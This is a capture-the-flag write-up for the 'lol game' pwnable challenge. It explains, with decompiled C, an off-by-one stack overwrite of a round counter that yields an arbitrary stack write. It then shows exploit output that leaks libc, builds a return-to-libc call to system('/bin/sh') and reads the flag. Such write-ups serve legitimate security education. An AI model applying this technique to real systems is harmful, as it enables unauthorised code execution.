# lol game
**Category:** Pwnable
**Points:** 831
**Solves:** 14
**Description:**
> Download in : [Link](https://drive.google.com/open?id=15XYB41jAtwH58LxNDhRQSXWHaqzJ9cdZ)
> Service: nc armexploit.acebear.site 3004

## Writeup
```
$ file LOLgame 
LOLgame: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=a9d22e211c215fa4e68630a6cf0c9eeb610eba24, stripped
```

### The Bug
Binary has some functions: Play, showScore, ChangeName and exit.

Function ChangeName:
```c
int __cdecl main()
{
  char name; // [esp+4h] [ebp-E4h]
  char round; // [esp+14h] [ebp-D4h]
  ...
  ChangeName(&name);
  ...
}
```
```c
int __cdecl ChangeName(void *buf)
{
  ssize_t size; // eax
  int result; // eax
  ssize_t _size; // [esp+Ch] [ebp-Ch]

  size = read(0, buf, 0x11u);
  _size = size;
  result = *(buf + size - 1);
  if ( result == 10 )
  {
    result = buf + _size - 1;
    *result = 0;
  }
  return result;
}
```

We can see stack overflow in ChangeName function.
> name in ebp-0xE4
> round in ebp-0xD4
> but read(0, name, 0x11)
so we can overwrite **round** variable.

In Play function:
* We can bet any points (both positive and negative number)
* We always lose, then *(&game->round + game->round) = -bet;

We can control game->round by ChangeName function, we can bet any points. So we can overwrite return address on stack.

### Exploit
[lolgame.py](/pwn/lolgame/lolgame.py)
```
$ python lolgame.py 2
[+] Opening connection to lolgame.acebear.site on port 3004: Done
[*] write at 57 value 0x80483c0
[*] write at 58 value 0x8048a2a
[*] write at 59 value 0x8049108
[*] printf: 0xf7dab880
[*] baselibc: 0xf7d62000
[*] system: 0xf7d9c900
[*] str_bin_sh: 0xf7ebf00f
[*] write at 55 value 0xf7d9c900
[*] write at 56 value 0x8048a2a
[*] write at 57 value 0xf7ebf00f
?
[*] Switching to interactive mode
Bye!$ id
uid=1000(lolgame) gid=1000(lolgame) groups=1000(lolgame)
$ cat /ho*/*/flag
AceBear{tH4_r00t_1s_pr0gr4m_l3u7_u_are_hum4n}$ 
```

